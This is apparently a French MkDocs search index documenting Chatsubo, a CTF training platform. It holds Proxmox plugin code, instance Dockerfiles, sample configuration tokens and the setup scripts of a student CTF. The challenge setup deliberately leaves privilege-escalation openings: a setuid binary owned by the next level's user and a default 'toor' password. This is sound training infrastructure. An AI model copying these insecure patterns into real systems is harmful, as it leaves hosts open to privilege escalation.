{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Table des mati\u00e8res # Cyber Threat Intelligence Melody Meloctl lab.bonjourmalwa.re S\u00e9curit\u00e9 d\u00e9fensive NoMoreDuck S\u00e9curit\u00e9 offensive OrgASM CTF Chatsubo ACK&/ Challenges","title":"Table des mati\u00e8res"},{"location":"#table-des-matieres","text":"Cyber Threat Intelligence Melody Meloctl lab.bonjourmalwa.re S\u00e9curit\u00e9 d\u00e9fensive NoMoreDuck S\u00e9curit\u00e9 offensive OrgASM CTF Chatsubo ACK&/ Challenges","title":"Table des mati\u00e8res"},{"location":"ctf/","text":"CTF # Chatsubo # Info Source : Publication du code pr\u00e9vue d\u00e9but juillet Inspiration : CTFd , Hackbox , HackTheBox , TryHackMe Technologies : Python, VueJS, Docker, Wireguard La plateforme Chatsubo a \u00e9t\u00e9 cr\u00e9\u00e9e dans l'optique de donner la possibilit\u00e9 aux communaut\u00e9s de toutes tailles de proposer \u00e0 leurs membres une plateforme d'entra\u00eenement capable d'h\u00e9berger des instances vuln\u00e9rables. Aper\u00e7u # Your browser does not support the video tag. Ajout d'une machine et connexion \u00e0 l'instance Affichage des challenges de la track \"Confirm\u00e9\" Listing des joueurs Profil des challenges Interface d'\u00e9dition des challenges Affichage des tentatives de validation en temps r\u00e9el Interface d'administration des challenges Note Les captures de d\u00e9mo ont \u00e9t\u00e9 r\u00e9alis\u00e9s avec le th\u00e8me du CTF ACK&/. Les instances # Chaque challenge se compose de deux parties : Le template, qui correspond \u00e0 l'image \u00e0 partir de laquelle l'instance sera d\u00e9ploy\u00e9e L'instance d\u00e9ploy\u00e9e, qui expose les informations li\u00e9es \u00e0 son \u00e9tat ainsi que celles n\u00e9cessaires pour communiquer avec (adresse IP, realm) Lorsque le syst\u00e8me de flag dynamique est utilis\u00e9, l'instance mettra \u00e9galement \u00e0 disposition les m\u00e9tadonn\u00e9es n\u00e9cessaires pour leur validation depuis la plateforme. Pour l'instant, seul Docker supporte ce syst\u00e8me gr\u00e2ce aux labels, qu'il est possible de r\u00e9cup\u00e9rer via l'API et qui sont \u00e9galement accessible au sein du conteneur via les variables d'environnement lors de l'instanciation. Exemple de Dockerfile se basant sur ce syst\u00e8me : FROM alpine:3.12 RUN apk add python3 ARG FLAG0 ARG SESSION LABEL chatsubo.template = \"hello-flag\" \\ chatsubo.flags.helloworld.value = \" $FLAG0 \" \\ chatsubo.flags.helloworld.points = \"25\" \\ chatsubo.session = \" $SESSION \" RUN mkdir /secrets RUN echo \" $FLAG0 \" > /secrets/flag WORKDIR /secrets CMD /bin/sh Avec la ligne de commande permettant de d\u00e9ployer une instance \u00e0 partir de ce template : docker build . --build-arg FLAG0 = level0 --build-arg SESSION = $( cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1 ) Toutes les informations expos\u00e9s par les labels sont accessible depuis Chatsubo et peuvent \u00eatre utilis\u00e9es pour valider les flags, aiguiller les utilisateurs vers leurs instances, etc. Les providers # Le principe fondamental du fonctionnement du backend est le suivant : le serveur re\u00e7oit des ordres qu'il transmet aux plugins, qui savent comment l'ex\u00e9cuter. Cette architecture vise \u00e0 favoriser au maximum l'adaptation de Chatsubo aux diff\u00e9rents environnements de virtualisation des communaut\u00e9s amen\u00e9es \u00e0 l'utiliser, Ainsi, les plugins tiennent d'une part le r\u00f4le de traducteur entre les donn\u00e9es expos\u00e9es par l'hyperviseur et celles attendues par la plateforme pour fonctionner, et d'autre part celui d'interm\u00e9diaire entre les ordres re\u00e7ues depuis l'interface et la mani\u00e8re de les \u00e9x\u00e9cut\u00e9s. Il existe aujourd'hui un plugin pour Docker et pour PVE. Si l'on prend PVE comme exemple, il suffit de cr\u00e9er deux fichiers pour le rendre compatible avec Chatsubo : Un fichier provider.py qui remplit les besoins suivants : Lister les templates disponibles Lister les instances en cours d'ex\u00e9cution Rollback une instance au snapshot d\u00e9fini comme l'\u00e9tat initial de la machine Cr\u00e9er une instance du provider \u00e0 partir des donn\u00e9es disponibles dans le fichier de configuration Et un fichier instance.py qui traduit les informations re\u00e7ues de l'hyperviseur et qui contient les donn\u00e9es suivantes : Son nom Le realm dont elle fait partie Le template duquel elle est issue Son adresse IP Afficher le code du fichier \"provider.py\" du plugin PVE import re import traceback import requests from proxmoxer import ProxmoxAPI from urllib3.exceptions import MaxRetryError from app.providers.base.provider import BaseProvider from app.providers.base.template import BaseTemplate from app.providers.exc import VpnProviderNotFoundException , \\ VpnProviderErrorException , BackendConnectionException , MetadataNotFoundException , MalformedMetadataException from app.providers.pve.instance import PVEInstance class PVEProvider ( BaseProvider ): kind = \"pve\" def __init__ ( self , name , host , user , token_name , token_value , vpns , nodes = None , verify_ssl = False , sep = \"--\" ): if nodes is None : nodes = [ \"pve\" ] self . name = name self . nodes = nodes self . sep = sep self . client = ProxmoxAPI ( host , user = user , token_name = token_name , token_value = token_value , verify_ssl = verify_ssl ) remote_nodes = [ node_data [ \"node\" ] for node_data in self . client . nodes . get ()] for node in self . nodes : if node not in remote_nodes : raise BackendConnectionException ( f \" { self . kind } / { self . name } \" , f \"Node ' { node } ' not found\" ) super () . __init__ ( kind = self . kind , vpn_confs = vpns ) def test_client ( self ): nodes = self . client . nodes . get () for node in nodes : self . client . nodes ( node [ \"node\" ]) . status . get () def list_templates ( self ): templates = [] vms = self . list_all () try : filtered = list ( filter ( lambda vm : \"CHATSUBO_\" in vm [ \"description\" ] and vm [ \"template\" ] == 1 , vms )) rg = re . compile ( \"CHATSUBO_TEMPLATE=(.*)\" ) for config in filtered : match = rg . search ( config [ \"description\" ]) if not match : continue name = match [ 1 ] templates . append ( BaseTemplate ( name , self . to_json ()) . to_json ()) except Exception : raise return templates def list_all ( self ): vms = [] for node in self . nodes : try : instances = self . client . nodes ( node ) . qemu . get () except ( MaxRetryError , requests . exceptions . ConnectionError , ConnectionRefusedError ) as e : raise BackendConnectionException ( f \" { self . kind } / { self . name } \" , str ( e )) for inst in instances : inst [ \"description\" ] = self . client . nodes ( node ) . qemu ( inst [ \"vmid\" ]) . config . get () . get ( \"description\" , \"\" ) inst [ \"node\" ] = node vms += instances return vms def list_instances ( self , realm = None ): instances = [] vms = self . list_all () raw = list ( filter ( lambda vm : \"CHATSUBO_\" in vm [ \"description\" ] and vm [ \"template\" ] == \"\" , vms )) for vm in raw : try : instances . append ( PVEInstance ( vm [ \"vmid\" ], vm [ \"name\" ], self . prefix , vm [ \"description\" ], vm [ \"node\" ], self . sep )) except ( MetadataNotFoundException , MalformedMetadataException ): pass if realm : instances = list ( filter ( lambda i : i . realm == realm , instances )) return instances def reset ( self , realm , box , session = None ): target = None instances = self . list_instances ( realm = realm ) for inst in instances : if inst . template == box . template : target = inst snapshots = self . client . nodes ( target . node ) . qemu . get ( f \" { target . id } /snapshot\" ) last_snap_name = list ( filter ( lambda x : x . get ( \"running\" ) == 1 , snapshots ))[ 0 ] . get ( \"parent\" ) if not last_snap_name : return False self . client . nodes ( target . node ) . qemu . post ( f \" { target . id } /snapshot/ { last_snap_name } /rollback\" ) return True @classmethod def from_config ( cls , name , raw_conf ): parsed = { \"name\" : name , \"host\" : f \" { raw_conf [ 'api' ][ 'host' ] } : { raw_conf [ 'api' ][ 'port' ] } \" , \"user\" : raw_conf [ \"api\" ][ \"user\" ], \"token_name\" : raw_conf [ \"api\" ][ \"token\" ][ \"name\" ], \"token_value\" : raw_conf [ \"api\" ][ \"token\" ][ \"value\" ], \"vpns\" : raw_conf [ \"vpns\" ] } if nodes := raw_conf . get ( \"nodes\" ): parsed [ \"nodes\" ] = nodes if verif := raw_conf . get ( \"verify_ssl\" ): parsed [ \"verify_ssl\" ] = verif if sep := raw_conf . get ( \"sep\" ): parsed [ \"sep\" ] = sep return cls ( ** parsed ) Afficher le code du fichier \"instance.py\" du plugin PVE import re from app.providers.exc import MetadataNotFoundException , MalformedMetadataException from app.providers.base.instance import BaseInstance class PVEInstance ( BaseInstance ): def __init__ ( self , id , name , prefix , description , node = \"pve\" , sep = \"--\" ): self . prefix = prefix self . sep = sep self . node = node try : template , realm , address = self . parse_meta ( description ) except ( MetadataNotFoundException , MalformedMetadataException ): raise super ( PVEInstance , self ) . __init__ ( id , name , realm , template , address , sep ) def parse_meta ( self , raw ): \"\"\" Parse and extract the template, realm and IP address from the metadata field of the instance :param raw: string holding the metadata info :return: returns the template name, the realm holding this instance and its IP address \"\"\" template , realm , address = \"\" , \"\" , \"\" raw = raw . lower () if not any ( f \"chatsubo_ { key } \" in raw for key in [ \"template\" , \"realm\" , \"address\" ]): raise MalformedMetadataException rg = re . compile ( \"(chatsubo_\\w*)=(.*)\" , re . MULTILINE ) matches = rg . findall ( raw ) for match in matches : if match [ 0 ] . replace ( \"chatsubo_\" , \"\" ) == \"template\" : template = match [ 1 ] elif match [ 0 ] . replace ( \"chatsubo_\" , \"\" ) == \"realm\" : realm = match [ 1 ] elif match [ 0 ] . replace ( \"chatsubo_\" , \"\" ) == \"address\" : address = match [ 1 ] return template , realm , address def to_json ( self ): data = self . _to_json () data . update ({ \"node\" : self . node , }) return data Une fois le plugin cr\u00e9\u00e9, il suffit de renseigner les informations n\u00e9cessaires dans le fichier de configuration, comme l'exemple ci-dessous : providers : pve : warzone : # provider name api : user : \"api@pam\" host : \"https://pve.hacklab\" port : 8006 token : name : \"b5215aeb-ae28-432c-b1b7-047276d87cf\" value : \"dff1ae17-4eb3-4543-a9f2-a703f375c48\" vpns : - realm : \"wz01\" url : \"http://gate.hacklab:7474\" header : \"X-Chatsubo-Token\" token : \"W4etxFM57y1MfRCDqzkjKfZVMEbunhoOLNE9Hj9xg7YLoZ0FXZYW8SahlGPJy6SdlRDXfDHe75x9yEZWz9TasKqG5KNPjKsSumI7KVCw28FgLnMnnbsy7jvcGvUdhGVv\" endpoints : config : \"/api/vpn/get/:username\" check : \"/api/check\" docker : # Empty docker provider config Acc\u00e8s VPN # Afin de faciliter la gestion du r\u00e9seau et de l'acc\u00e8s des joueurs aux instances, il est n\u00e9cessaire de passer par un VPN pour acc\u00e9der aux machines. Les joueurs peuvent r\u00e9cup\u00e9rer leurs acc\u00e8s \u00e0 tout moment via l'interface web. Pour interfacer les ponts VPN avec la plateforme, nous avons besoin d'un client d\u00e9di\u00e9 install\u00e9 sur chacune de ces machines. Ce client s'appelle chatsubo-gate et communique avec Chatsubo via une API. Son r\u00f4le va \u00eatre d'envoyer le contenu des configurations pr\u00e9-g\u00e9n\u00e9r\u00e9es \u00e0 l'installation et de tenir une table \u00e9tablissant un lien entre un pseudo et une configuration VPN. J'utilise l'image Docker linuxserver.io pour g\u00e9n\u00e9rer les configurations et faire tourner le serveur, mais puisque chatsubo-gate n'a besoin que du dossier qui contient les configurations, n'importe quelle m\u00e9thode peut \u00eatre utilis\u00e9e. Une configuration minimale est n\u00e9cessaire pour que la plateforme et le pont VPN puisse communiquer : C\u00f4t\u00e9 chatsubo-gate , il est n\u00e9cessaire de renseigner le dossier contenant les fichiers de configurations, le realm ainsi que le token d'authentification utilis\u00e9 pour s\u00e9curiser les \u00e9changes avec la plateforme. realm : \"ans01\" # This token must be the same on the chatsubo plateform. \"cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 128 | head -n 1\" works well chatsubo_token : \"changeme_for_a_strong_and_random_token_like_128+_chars\" wg_clients_dir : \"/opt/chatsubo-gate/clients\" La notion de realm est importante puisqu'elle va nous permettre d'une part d'exposer plusieurs instances distinctes d'un m\u00eame template en parall\u00e8le, et d'autre part de connecter plusieurs ponts VPN h\u00e9berg\u00e9s sur plusieurs machines diff\u00e9rentes au m\u00eame sous r\u00e9seau. C\u00f4t\u00e9 Chatsubo, il est n\u00e9cessaire d'indiquer l'url du pont, le m\u00eame token et le realm correspondant dans la configuration de chaque provider. Par exemple : vpns : - realm : \"ans01\" url : \"http://challs.hacklab:7474\" header : \"X-Chatsubo-Token\" # This token must be the same on the linked chatsubo-gate. \"cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 128 | head -n 1\" works well chatsubo_token : \"changeme_for_a_strong_and_random_token_like_128+_chars\" endpoints : config : \"/api/vpn/get/:username\" check : \"/api/check\" L'en-t\u00eate utilis\u00e9 pour l'authentification ainsi que les endpoints sont modifiables via la configuration de Chatsubo afin de faciliter le d\u00e9veloppement d'un connecteur alternatif dans le but, par exemple, de suporter un r\u00e9seau bas\u00e9 sur OpenVPN. ACK&/ # Le CTF ACK&/ \u00e9tait un \u00e9v\u00e8nement destin\u00e9 exclusivement aux \u00e9l\u00e8ves de l'ESGI qui s'est d\u00e9roul\u00e9 du 19 au 21 f\u00e9vrier 2021. Les challenges \u00e9taient con\u00e7us pour se suivre et se r\u00e9partissaient sur plusieurs instances, comportant chacune 4 niveaux cons\u00e9cutifs. Exemple Pour passer du level0 au level1, il fallait r\u00e9ussir le challenge de l'utilisateur level0 puis se connecter au suivant gr\u00e2ce au flag obtenu. Deux tracks \u00e9taient disponibles : La track \"d\u00e9butants\" 12 challenges r\u00e9partis en 3 instances La track \"confirm\u00e9s\" 20 challenges r\u00e9partis en 5 instances D\u00e9ploiement des instances # L'ensemble des challenges pr\u00e9sents sur l'instance \u00e9taient install\u00e9s et configur\u00e9s lors du d\u00e9ploiement. Exemple de Dockerfile utilis\u00e9 pour d\u00e9ployer une instance FROM ubuntu:20.04 # Setup RUN apt update RUN apt install -y openssh-server vim man less netcat cron zip sl COPY src/root/etc /etc # Allow caching of apt by putting it below # level0 password ARG RNG0 = toor # Challenger's unique session, handled by Chatsubo ARG SESSION # Register all the generated flag passed by Chatsubo via --build-args # ENV is needed to allow entrypoint to access them ARG FLAG0 ARG FLAG1 ARG FLAG2 ARG FLAG3 ENV FLAGS = \" $FLAG0 ; $FLAG1 ; $FLAG2 ; $FLAG3 \" RUN echo $FLAGS RUN useradd -ms /bin/bash -p $( openssl passwd -6 \" $RNG0 \" ) level0 RUN useradd -ms /bin/bash -p $( openssl passwd -6 \" $FLAG0 \" ) level1 RUN useradd -ms /bin/bash -p $( openssl passwd -6 \" $FLAG1 \" ) level2 RUN useradd -ms /bin/bash -p $( openssl passwd -6 \" $FLAG2 \" ) level3 RUN useradd -ms /bin/bash -p $( openssl passwd -6 \" $FLAG3 \" ) level4 # Exposed metadata, needed by Chatsubo for dynamic flags, session handling and ssh initial access LABEL chatsubo.template = \"adv_ans01\" \\ chatsubo.creds.ssh.username = \"level0\" \\ chatsubo.creds.ssh.password = \" $RNG0 \" \\ chatsubo.flags.step0.value = \" $FLAG0 \" \\ chatsubo.flags.step0.points = \"250\" \\ chatsubo.flags.step1.value = \" $FLAG1 \" \\ chatsubo.flags.step1.points = \"250\" \\ chatsubo.flags.step2.value = \" $FLAG2 \" \\ chatsubo.flags.step2.points = \"250\" \\ chatsubo.flags.step3.value = \" $FLAG3 \" \\ chatsubo.flags.step3.points = \"250\" \\ chatsubo.session = \" $SESSION \" # Add challenges setup scripts and resources COPY src/root / RUN chmod u+x /home/level**/ans_init.sh # Needed for sshd RUN mkdir /run/sshd RUN echo \" $FLAGS \" > /root/flags COPY src/entrypoint.sh /entrypoint.sh RUN chmod u+x /entrypoint.sh ENTRYPOINT /bin/bash -c '/etc/init.d/cron start && cat /root/flags | /entrypoint.sh' Chaque dossier comprenait un Dockerfile comme celui ci-dessus ainsi que l'ensemble des fichiers \u00e0 copier dans le conteneur. Par exemple : . |-- Dockerfile |-- Makefile `-- src |-- entrypoint.sh `-- root |-- etc | `-- ssh | `-- sshd_config `-- home |-- level0 | |-- ans_init.sh | `-- main.c |-- level1 | |-- ans_init.sh | `-- hexhexhex |-- level2 | |-- ans_init.sh | |-- challenge.py | `-- create_flag.py |-- level3 | |-- ans_init.sh | |-- main.c | `-- patch.py `-- level4 |-- ans_init.sh `-- finish.txt L'entrypoint avait pour seul r\u00f4le d'appeler le script ans_init.sh pr\u00e9sent dans le home de chacun des utilisateurs, en lui transmettant le flag \u00e0 ins\u00e9rer dans le challenge, le nom de l'utilisateur courant ainsi que celui du suivant : #!/bin/bash rm -f $0 SCRIPT_NAME = \"ans_init.sh\" RAW_FLAGS = \" $( cat /root/flags ) \" FLAGS =( ${ RAW_FLAGS //;/ } ) # Start challenge setup script for each levels and remove it for i in { 0 ..4 } ; do current_user = \"level $i \" next_user = \"level $(( $i + 1 )) \" init_script = \"/home/level $i / $SCRIPT_NAME \" current_flag = ${ FLAGS [i] :- \"_\" } [ -f \" $init_script \" ] && bash -c \" $init_script $current_flag $current_user $next_user \" rm -f $init_script done rm -f /root/flags /etc/init.d/cron start # Allow remote access while true ; do /usr/sbin/sshd -e -D done Ce script, ans_init.sh , \u00e9tait \u00e9crit par le cr\u00e9ateur du challenge et s'occupait de mettre en place les diff\u00e9rents \u00e9l\u00e9ments n\u00e9cessaires \u00e0 son fonctionnement : FLAG = $1 CURRENT_USER = $2 NEXT_USER = $3 bin_name = \"hexhexhex\" chown -R \" $CURRENT_USER :\" \"/home/ $CURRENT_USER \" chown \" $NEXT_USER :\" \"/home/ $CURRENT_USER / $bin_name \" chmod u+xs \"/home/ $CURRENT_USER / $bin_name \" echo $FLAG > \"/home/ $NEXT_USER /flag\" chown \" $NEXT_USER :\" \"/home/ $NEXT_USER /flag\" chmod 400 \"/home/ $NEXT_USER /flag\"","title":"CTF"},{"location":"ctf/#ctf","text":"","title":"CTF"},{"location":"ctf/#chatsubo","text":"Info Source : Publication du code pr\u00e9vue d\u00e9but juillet Inspiration : CTFd , Hackbox , HackTheBox , TryHackMe Technologies : Python, VueJS, Docker, Wireguard La plateforme Chatsubo a \u00e9t\u00e9 cr\u00e9\u00e9e dans l'optique de donner la possibilit\u00e9 aux communaut\u00e9s de toutes tailles de proposer \u00e0 leurs membres une plateforme d'entra\u00eenement capable d'h\u00e9berger des instances vuln\u00e9rables.","title":"Chatsubo"},{"location":"ctf/#apercu","text":"Your browser does not support the video tag. Ajout d'une machine et connexion \u00e0 l'instance Affichage des challenges de la track \"Confirm\u00e9\" Listing des joueurs Profil des challenges Interface d'\u00e9dition des challenges Affichage des tentatives de validation en temps r\u00e9el Interface d'administration des challenges Note Les captures de d\u00e9mo ont \u00e9t\u00e9 r\u00e9alis\u00e9s avec le th\u00e8me du CTF ACK&/.","title":"Aper\u00e7u"},{"location":"ctf/#les-instances","text":"Chaque challenge se compose de deux parties : Le template, qui correspond \u00e0 l'image \u00e0 partir de laquelle l'instance sera d\u00e9ploy\u00e9e L'instance d\u00e9ploy\u00e9e, qui expose les informations li\u00e9es \u00e0 son \u00e9tat ainsi que celles n\u00e9cessaires pour communiquer avec (adresse IP, realm) Lorsque le syst\u00e8me de flag dynamique est utilis\u00e9, l'instance mettra \u00e9galement \u00e0 disposition les m\u00e9tadonn\u00e9es n\u00e9cessaires pour leur validation depuis la plateforme. Pour l'instant, seul Docker supporte ce syst\u00e8me gr\u00e2ce aux labels, qu'il est possible de r\u00e9cup\u00e9rer via l'API et qui sont \u00e9galement accessible au sein du conteneur via les variables d'environnement lors de l'instanciation. Exemple de Dockerfile se basant sur ce syst\u00e8me : FROM alpine:3.12 RUN apk add python3 ARG FLAG0 ARG SESSION LABEL chatsubo.template = \"hello-flag\" \\ chatsubo.flags.helloworld.value = \" $FLAG0 \" \\ chatsubo.flags.helloworld.points = \"25\" \\ chatsubo.session = \" $SESSION \" RUN mkdir /secrets RUN echo \" $FLAG0 \" > /secrets/flag WORKDIR /secrets CMD /bin/sh Avec la ligne de commande permettant de d\u00e9ployer une instance \u00e0 partir de ce template : docker build . --build-arg FLAG0 = level0 --build-arg SESSION = $( cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1 ) Toutes les informations expos\u00e9s par les labels sont accessible depuis Chatsubo et peuvent \u00eatre utilis\u00e9es pour valider les flags, aiguiller les utilisateurs vers leurs instances, etc.","title":"Les instances"},{"location":"ctf/#les-providers","text":"Le principe fondamental du fonctionnement du backend est le suivant : le serveur re\u00e7oit des ordres qu'il transmet aux plugins, qui savent comment l'ex\u00e9cuter. Cette architecture vise \u00e0 favoriser au maximum l'adaptation de Chatsubo aux diff\u00e9rents environnements de virtualisation des communaut\u00e9s amen\u00e9es \u00e0 l'utiliser, Ainsi, les plugins tiennent d'une part le r\u00f4le de traducteur entre les donn\u00e9es expos\u00e9es par l'hyperviseur et celles attendues par la plateforme pour fonctionner, et d'autre part celui d'interm\u00e9diaire entre les ordres re\u00e7ues depuis l'interface et la mani\u00e8re de les \u00e9x\u00e9cut\u00e9s. Il existe aujourd'hui un plugin pour Docker et pour PVE. Si l'on prend PVE comme exemple, il suffit de cr\u00e9er deux fichiers pour le rendre compatible avec Chatsubo : Un fichier provider.py qui remplit les besoins suivants : Lister les templates disponibles Lister les instances en cours d'ex\u00e9cution Rollback une instance au snapshot d\u00e9fini comme l'\u00e9tat initial de la machine Cr\u00e9er une instance du provider \u00e0 partir des donn\u00e9es disponibles dans le fichier de configuration Et un fichier instance.py qui traduit les informations re\u00e7ues de l'hyperviseur et qui contient les donn\u00e9es suivantes : Son nom Le realm dont elle fait partie Le template duquel elle est issue Son adresse IP Afficher le code du fichier \"provider.py\" du plugin PVE import re import traceback import requests from proxmoxer import ProxmoxAPI from urllib3.exceptions import MaxRetryError from app.providers.base.provider import BaseProvider from app.providers.base.template import BaseTemplate from app.providers.exc import VpnProviderNotFoundException , \\ VpnProviderErrorException , BackendConnectionException , MetadataNotFoundException , MalformedMetadataException from app.providers.pve.instance import PVEInstance class PVEProvider ( BaseProvider ): kind = \"pve\" def __init__ ( self , name , host , user , token_name , token_value , vpns , nodes = None , verify_ssl = False , sep = \"--\" ): if nodes is None : nodes = [ \"pve\" ] self . name = name self . nodes = nodes self . sep = sep self . client = ProxmoxAPI ( host , user = user , token_name = token_name , token_value = token_value , verify_ssl = verify_ssl ) remote_nodes = [ node_data [ \"node\" ] for node_data in self . client . nodes . get ()] for node in self . nodes : if node not in remote_nodes : raise BackendConnectionException ( f \" { self . kind } / { self . name } \" , f \"Node ' { node } ' not found\" ) super () . __init__ ( kind = self . kind , vpn_confs = vpns ) def test_client ( self ): nodes = self . client . nodes . get () for node in nodes : self . client . nodes ( node [ \"node\" ]) . status . get () def list_templates ( self ): templates = [] vms = self . list_all () try : filtered = list ( filter ( lambda vm : \"CHATSUBO_\" in vm [ \"description\" ] and vm [ \"template\" ] == 1 , vms )) rg = re . compile ( \"CHATSUBO_TEMPLATE=(.*)\" ) for config in filtered : match = rg . search ( config [ \"description\" ]) if not match : continue name = match [ 1 ] templates . append ( BaseTemplate ( name , self . to_json ()) . to_json ()) except Exception : raise return templates def list_all ( self ): vms = [] for node in self . nodes : try : instances = self . client . nodes ( node ) . qemu . get () except ( MaxRetryError , requests . exceptions . ConnectionError , ConnectionRefusedError ) as e : raise BackendConnectionException ( f \" { self . kind } / { self . name } \" , str ( e )) for inst in instances : inst [ \"description\" ] = self . client . nodes ( node ) . qemu ( inst [ \"vmid\" ]) . config . get () . get ( \"description\" , \"\" ) inst [ \"node\" ] = node vms += instances return vms def list_instances ( self , realm = None ): instances = [] vms = self . list_all () raw = list ( filter ( lambda vm : \"CHATSUBO_\" in vm [ \"description\" ] and vm [ \"template\" ] == \"\" , vms )) for vm in raw : try : instances . append ( PVEInstance ( vm [ \"vmid\" ], vm [ \"name\" ], self . prefix , vm [ \"description\" ], vm [ \"node\" ], self . sep )) except ( MetadataNotFoundException , MalformedMetadataException ): pass if realm : instances = list ( filter ( lambda i : i . realm == realm , instances )) return instances def reset ( self , realm , box , session = None ): target = None instances = self . list_instances ( realm = realm ) for inst in instances : if inst . template == box . template : target = inst snapshots = self . client . nodes ( target . node ) . qemu . get ( f \" { target . id } /snapshot\" ) last_snap_name = list ( filter ( lambda x : x . get ( \"running\" ) == 1 , snapshots ))[ 0 ] . get ( \"parent\" ) if not last_snap_name : return False self . client . nodes ( target . node ) . qemu . post ( f \" { target . id } /snapshot/ { last_snap_name } /rollback\" ) return True @classmethod def from_config ( cls , name , raw_conf ): parsed = { \"name\" : name , \"host\" : f \" { raw_conf [ 'api' ][ 'host' ] } : { raw_conf [ 'api' ][ 'port' ] } \" , \"user\" : raw_conf [ \"api\" ][ \"user\" ], \"token_name\" : raw_conf [ \"api\" ][ \"token\" ][ \"name\" ], \"token_value\" : raw_conf [ \"api\" ][ \"token\" ][ \"value\" ], \"vpns\" : raw_conf [ \"vpns\" ] } if nodes := raw_conf . get ( \"nodes\" ): parsed [ \"nodes\" ] = nodes if verif := raw_conf . get ( \"verify_ssl\" ): parsed [ \"verify_ssl\" ] = verif if sep := raw_conf . get ( \"sep\" ): parsed [ \"sep\" ] = sep return cls ( ** parsed ) Afficher le code du fichier \"instance.py\" du plugin PVE import re from app.providers.exc import MetadataNotFoundException , MalformedMetadataException from app.providers.base.instance import BaseInstance class PVEInstance ( BaseInstance ): def __init__ ( self , id , name , prefix , description , node = \"pve\" , sep = \"--\" ): self . prefix = prefix self . sep = sep self . node = node try : template , realm , address = self . parse_meta ( description ) except ( MetadataNotFoundException , MalformedMetadataException ): raise super ( PVEInstance , self ) . __init__ ( id , name , realm , template , address , sep ) def parse_meta ( self , raw ): \"\"\" Parse and extract the template, realm and IP address from the metadata field of the instance :param raw: string holding the metadata info :return: returns the template name, the realm holding this instance and its IP address \"\"\" template , realm , address = \"\" , \"\" , \"\" raw = raw . lower () if not any ( f \"chatsubo_ { key } \" in raw for key in [ \"template\" , \"realm\" , \"address\" ]): raise MalformedMetadataException rg = re . compile ( \"(chatsubo_\\w*)=(.*)\" , re . MULTILINE ) matches = rg . findall ( raw ) for match in matches : if match [ 0 ] . replace ( \"chatsubo_\" , \"\" ) == \"template\" : template = match [ 1 ] elif match [ 0 ] . replace ( \"chatsubo_\" , \"\" ) == \"realm\" : realm = match [ 1 ] elif match [ 0 ] . replace ( \"chatsubo_\" , \"\" ) == \"address\" : address = match [ 1 ] return template , realm , address def to_json ( self ): data = self . _to_json () data . update ({ \"node\" : self . node , }) return data Une fois le plugin cr\u00e9\u00e9, il suffit de renseigner les informations n\u00e9cessaires dans le fichier de configuration, comme l'exemple ci-dessous : providers : pve : warzone : # provider name api : user : \"api@pam\" host : \"https://pve.hacklab\" port : 8006 token : name : \"b5215aeb-ae28-432c-b1b7-047276d87cf\" value : \"dff1ae17-4eb3-4543-a9f2-a703f375c48\" vpns : - realm : \"wz01\" url : \"http://gate.hacklab:7474\" header : \"X-Chatsubo-Token\" token : \"W4etxFM57y1MfRCDqzkjKfZVMEbunhoOLNE9Hj9xg7YLoZ0FXZYW8SahlGPJy6SdlRDXfDHe75x9yEZWz9TasKqG5KNPjKsSumI7KVCw28FgLnMnnbsy7jvcGvUdhGVv\" endpoints : config : \"/api/vpn/get/:username\" check : \"/api/check\" docker : # Empty docker provider config","title":"Les providers"},{"location":"ctf/#acces-vpn","text":"Afin de faciliter la gestion du r\u00e9seau et de l'acc\u00e8s des joueurs aux instances, il est n\u00e9cessaire de passer par un VPN pour acc\u00e9der aux machines. Les joueurs peuvent r\u00e9cup\u00e9rer leurs acc\u00e8s \u00e0 tout moment via l'interface web. Pour interfacer les ponts VPN avec la plateforme, nous avons besoin d'un client d\u00e9di\u00e9 install\u00e9 sur chacune de ces machines. Ce client s'appelle chatsubo-gate et communique avec Chatsubo via une API. Son r\u00f4le va \u00eatre d'envoyer le contenu des configurations pr\u00e9-g\u00e9n\u00e9r\u00e9es \u00e0 l'installation et de tenir une table \u00e9tablissant un lien entre un pseudo et une configuration VPN. J'utilise l'image Docker linuxserver.io pour g\u00e9n\u00e9rer les configurations et faire tourner le serveur, mais puisque chatsubo-gate n'a besoin que du dossier qui contient les configurations, n'importe quelle m\u00e9thode peut \u00eatre utilis\u00e9e. Une configuration minimale est n\u00e9cessaire pour que la plateforme et le pont VPN puisse communiquer : C\u00f4t\u00e9 chatsubo-gate , il est n\u00e9cessaire de renseigner le dossier contenant les fichiers de configurations, le realm ainsi que le token d'authentification utilis\u00e9 pour s\u00e9curiser les \u00e9changes avec la plateforme. realm : \"ans01\" # This token must be the same on the chatsubo plateform. \"cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 128 | head -n 1\" works well chatsubo_token : \"changeme_for_a_strong_and_random_token_like_128+_chars\" wg_clients_dir : \"/opt/chatsubo-gate/clients\" La notion de realm est importante puisqu'elle va nous permettre d'une part d'exposer plusieurs instances distinctes d'un m\u00eame template en parall\u00e8le, et d'autre part de connecter plusieurs ponts VPN h\u00e9berg\u00e9s sur plusieurs machines diff\u00e9rentes au m\u00eame sous r\u00e9seau. C\u00f4t\u00e9 Chatsubo, il est n\u00e9cessaire d'indiquer l'url du pont, le m\u00eame token et le realm correspondant dans la configuration de chaque provider. Par exemple : vpns : - realm : \"ans01\" url : \"http://challs.hacklab:7474\" header : \"X-Chatsubo-Token\" # This token must be the same on the linked chatsubo-gate. \"cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 128 | head -n 1\" works well chatsubo_token : \"changeme_for_a_strong_and_random_token_like_128+_chars\" endpoints : config : \"/api/vpn/get/:username\" check : \"/api/check\" L'en-t\u00eate utilis\u00e9 pour l'authentification ainsi que les endpoints sont modifiables via la configuration de Chatsubo afin de faciliter le d\u00e9veloppement d'un connecteur alternatif dans le but, par exemple, de suporter un r\u00e9seau bas\u00e9 sur OpenVPN.","title":"Acc\u00e8s VPN"},{"location":"ctf/#ack","text":"Le CTF ACK&/ \u00e9tait un \u00e9v\u00e8nement destin\u00e9 exclusivement aux \u00e9l\u00e8ves de l'ESGI qui s'est d\u00e9roul\u00e9 du 19 au 21 f\u00e9vrier 2021. Les challenges \u00e9taient con\u00e7us pour se suivre et se r\u00e9partissaient sur plusieurs instances, comportant chacune 4 niveaux 